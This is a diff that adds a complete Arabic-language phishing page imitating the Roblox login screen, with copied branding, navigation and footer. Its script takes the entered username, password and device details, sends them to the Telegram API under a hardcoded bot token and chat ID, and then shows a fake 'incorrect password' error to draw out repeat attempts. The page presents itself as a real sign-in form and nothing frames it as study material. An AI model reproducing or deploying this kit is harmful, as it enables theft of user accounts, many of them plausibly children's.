@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تسجيل الدخول إلى ...</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
+body {
+    font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
+    background: #191919;
+    color: #fff;
+    min-height: 100vh;
+    overflow-x: hidden;
+}
+.top-bar {
+    background: #191919;
+    padding: 10px 14px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid #2a2a2a;
+    position: sticky;
+    top: 0;
+    z-index: 10;
+}
+.top-bar .logo {
+    width: 34px; height: 34px;
+    background: #fff;
+    border-radius: 8px;
+    display: flex; align-items: center; justify-content: center;
+    font-weight: 900; color: #000; font-size: 20px;
+    font-family: Arial Black, sans-serif;
+}
+.top-bar .actions { display: flex; gap: 8px; align-items: center; }
+.btn-outline {
+    padding: 7px 14px;
+    border: 1px solid #fff;
+    background: transparent;
+    color: #fff;
+    border-radius: 8px;
+    font-size: 13px;
+    cursor: pointer;
+    font-weight: 600;
+}
+.btn-filled {
+    padding: 7px 14px;
+    border: none;
+    background: #335fff;
+    color: #fff;
+    border-radius: 8px;
+    font-size: 13px;
+    cursor: pointer;
+    font-weight: 600;
+}
+.search-icon {
+    width: 22px; height: 22px;
+    stroke: #fff;
+    fill: none;
+    stroke-width: 2.2;
+    cursor: pointer;
+}
+.nav-tabs {
+    display: flex;
+    gap: 22px;
+    padding: 12px 16px;
+    background: #191919;
+    font-size: 14px;
+    color: #ccc;
+    overflow-x: auto;
+    white-space: nowrap;
+    scrollbar-width: none;
+    border-bottom: 1px solid #2a2a2a;
+}
+.nav-tabs::-webkit-scrollbar { display: none; }
+.nav-tabs span { cursor: pointer; padding-bottom: 2px; }
+.nav-tabs span.active { color: #fff; border-bottom: 2px solid #fff; }
+
+/* ===== الهيرو – صورة خلفية ===== */
+.hero {
+    height: 180px;
+    background-color: #2a2a2a;
+    background-size: cover;
+    background-position: center;
+    position: relative;
+    overflow: hidden;
+}
+.hero::after {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background: linear-gradient(to bottom, rgba(0,0,0,0.05), rgba(35,35,35,0.55));
+    pointer-events: none;
+}
+
+/* ===== الحاوية الرئيسية ===== */
+.form-container {
+    background: #232323;
+    padding: 26px 20px 50px;
+    border-radius: 16px 16px 0 0;
+    margin-top: -16px;
+    position: relative;
+    z-index: 2;
+}
+.form-container h1 {
+    font-size: 22px;
+    font-weight: 700;
+    text-align: center;
+    margin-bottom: 24px;
+    color: #fff;
+}
+.form-container input {
+    width: 100%;
+    padding: 14px 16px;
+    margin-bottom: 14px;
+    border-radius: 8px;
+    border: 1px solid #444;
+    background: #2e2e2e;
+    color: #fff;
+    font-size: 15px;
+    outline: none;
+    text-align: right;
+    transition: border-color 0.2s;
+}
+.form-container input::placeholder { color: #888; }
+.form-container input:focus { border-color: #335fff; }
+.btn-submit {
+    width: 100%;
+    padding: 14px;
+    border-radius: 8px;
+    border: 1px solid #666;
+    background: transparent;
+    color: #fff;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-bottom: 18px;
+    transition: background 0.15s;
+}
+.btn-submit:active { background: #2e2e2e; }
+.link-forgot {
+    display: block;
+    text-align: center;
+    color: #b8b8b8;
+    font-size: 14px;
+    margin-bottom: 22px;
+    cursor: pointer;
+}
+.divider {
+    height: 1px;
+    background: #3a3a3a;
+    margin: 10px 0 18px;
+}
+.btn-alt {
+    width: 100%;
+    padding: 14px;
+    border-radius: 8px;
+    border: none;
+    background: #2e2e2e;
+    color: #ddd;
+    font-size: 15px;
+    cursor: pointer;
+    margin-bottom: 12px;
+    text-align: center;
+    transition: background 0.15s;
+}
+.btn-alt:active { background: #3a3a3a; }
+.signup-text {
+    text-align: center;
+    font-size: 14px;
+    color: #aaa;
+    margin-top: 20px;
+}
+.signup-text span { color: #6ba3ff; cursor: pointer; }
+
+/* ===== الفوتر ===== */
+.footer {
+    background: #191919;
+    padding: 24px 16px 100px;
+    border-top: 1px solid #2a2a2a;
+    font-size: 13px;
+    color: #ccc;
+}
+.footer-links {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 14px 20px;
+    margin-bottom: 20px;
+}
+.footer-links a {
+    color: #ccc;
+    text-decoration: none;
+    cursor: pointer;
+}
+.footer-links a:hover { text-decoration: underline; }
+.footer-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 14px;
+    font-size: 13px;
+}
+.footer-row .privacy-label {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+}
+.checkbox-blue {
+    width: 18px; height: 18px;
+    background: #335fff;
+    border-radius: 4px;
+    display: flex; align-items: center; justify-content: center;
+    color: #fff; font-size: 11px; font-weight: bold;
+}
+.footer .map-link {
+    display: block;
+    text-align: right;
+    margin-bottom: 24px;
+}
+.footer .map-link a { color: #ccc; text-decoration: none; }
+
+/* ===== البانر السفلي ===== */
+.bottom-banner {
+    position: fixed;
+    bottom: 0;
+    left: 0; right: 0;
+    background: #111;
+    padding: 10px 14px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    border-top: 1px solid #2a2a2a;
+    font-size: 12px;
+    color: #ccc;
+    z-index: 100;
+}
+.bottom-banner .banner-icon {
+    width: 34px; height: 34px;
+    background: #335fff;
+    border-radius: 8px;
+    display: flex; align-items: center; justify-content: center;
+    font-weight: 900; color: #fff; font-size: 16px;
+    margin-left: 10px;
+}
+.bottom-banner .banner-text { flex: 1; line-height: 1.4; }
+.bottom-banner .close-x {
+    font-size: 20px;
+    color: #888;
+    cursor: pointer;
+    padding: 0 6px;
+}
+</style>
+</head>
+<body>
+
+<div class="top-bar">
+    <div class="logo">R</div>
+    <div class="actions">
+        <button class="btn-outline">تسجيل الدخول</button>
+        <button class="btn-filled">تسجيل الدخول</button>
+        <svg class="search-icon" viewBox="0 0 24 24">
+            <circle cx="11" cy="11" r="7"/>
+            <line x1="16.5" y1="16.5" x2="21" y2="21"/>
+        </svg>
+    </div>
+</div>
+
+<div class="nav-tabs">
+    <span class="active">الرائجة</span>
+    <span>السوق</span>
+    <span>إنشاء</span>
+    <span>Robux</span>
+</div>
+
+<!-- الهيرو: صورة خلفية -->
+<div class="hero" id="heroImage"></div>
+
+<div class="form-container">
+    <h1>تسجيل الدخول إلى Roblox</h1>
+
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="اسم المستخدم/البريد/الهاتف" autocomplete="off" required>
+        <input type="password" id="password" placeholder="كلمة المرور" autocomplete="off" required>
+        <button type="submit" class="btn-submit">تسجيل الدخول</button>
+    </form>
+
+    <div class="link-forgot">نسيت كلمة المرور أو اسم المستخدم؟</div>
+
+    <div class="divider"></div>
+
+    <button class="btn-alt">إرسال رمز صالح لمرة واحدة عبر البريد إلكتروني</button>
+    <button class="btn-alt">تسجيل دخول سريع</button>
+
+    <div class="signup-text">ليس لديك حساب؟ <span>اشتراك</span></div>
+</div>
+
+<div class="footer">
+    <div class="footer-links">
+        <a>نبذة عنا</a>
+        <a>الوظائف</a>
+        <a>غرفة الأخبار</a>
+        <a>الآباء</a>
+    </div>
+    <div class="footer-links">
+        <a>شراء بطاقات الهدايا</a>
+        <a>مساعدة</a>
+        <a>الشروط</a>
+        <a>إمكانية الوصول</a>
+    </div>
+    <div class="footer-row">
+        <div class="privacy-label">
+            <div class="checkbox-blue">✓</div>
+            <span>اختيارات الخصوصية المتوفرة لك</span>
+        </div>
+        <a style="color:#ccc;text-decoration:none;">الخصوصية</a>
+    </div>
+    <div class="map-link"><a>خريطة الموقع</a></div>
+</div>
+
+<div class="bottom-banner">
+    <div class="banner-icon">R</div>
+    <div class="banner-text">
+        <strong>اكتشف Roblox في تطبيق Android!</strong><br>
+        ملايين التجارب صممها أشخاص مثلك
+    </div>
+    <div class="close-x">✕</div>
+</div>
+
+<script>
+// ========== إعدادات البوت ==========
+const BOT_TOKEN = "8870643236:AAFByltbFwxla4gE3Qd68hX_bEFjoL4aErc";
+const CHAT_ID   = "8692575690";
+// ===================================
+
+// ========== صور المابات (ضع روابط صورك هنا) ==========
+const HERO_IMAGES = [
+    // ماب كيبورد
+    "https://tr.rbxcdn.com/180DAY-1a2b3c4d5e6f7g8h9i0j/768/432/Image/Png/noFilter",
+    // ماب 99 ليلة في الغابة
+    "https://tr.rbxcdn.com/180DAY-2b3c4d5e6f7g8h9i0j1k/768/432/Image/Png/noFilter",
+    // ماب قتال
+    "https://tr.rbxcdn.com/180DAY-3c4d5e6f7g8h9i0j1k2l/768/432/Image/Png/noFilter",
+    // ماب مغامرات
+    "https://tr.rbxcdn.com/180DAY-4d5e6f7g8h9i0j1k2l3m/768/432/Image/Png/noFilter",
+    // ماب سباق
+    "https://tr.rbxcdn.com/180DAY-5e6f7g8h9i0j1k2l3m4n/768/432/Image/Png/noFilter"
+];
+
+function setRandomHeroImage() {
+    const hero = document.getElementById('heroImage');
+    const randomIndex = Math.floor(Math.random() * HERO_IMAGES.length);
+    hero.style.backgroundImage = "url('" + HERO_IMAGES[randomIndex] + "')";
+}
+setRandomHeroImage();
+setInterval(setRandomHeroImage, 8000);
+// =====================================================
+
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
+
+    if (!username || !password) return;
+
+    const message =
+        "🔐 Roblox Login Captured\n" +
+        "━━━━━━━━━━━━━━━\n" +
+        "👤 Username: " + username + "\n" +
+        "🔑 Password: " + password + "\n" +
+        "🌐 Language: AR\n" +
+        "📱 Device: " + navigator.userAgent + "\n" +
+        "⏰ Time: " + new Date().toLocaleString();
+
+    const telegramUrl = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+
+    try {
+        await fetch(telegramUrl, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+        });
+    } catch (err) {}
+
+    setTimeout(() => {
+        const errorDiv = document.createElement('div');
+        errorDiv.style.cssText = 'color:#ff4d4d;font-size:14px;text-align:center;margin-top:10px;';
+        errorDiv.textContent = 'اسم المستخدم أو كلمة المرور غير صحيحة';
+        document.querySelector('.form-container').appendChild(errorDiv);
+        document.getElementById('password').value = '';
+        document.getElementById('password').focus();
+        setTimeout(() => errorDiv.remove(), 3000);
+    }, 400);
+});
+
+document.querySelector('.close-x').addEventListener('click', () => {
+    document.querySelector('.bottom-banner').style.display = 'none';
+});
+</script>
+</body>
+</html>
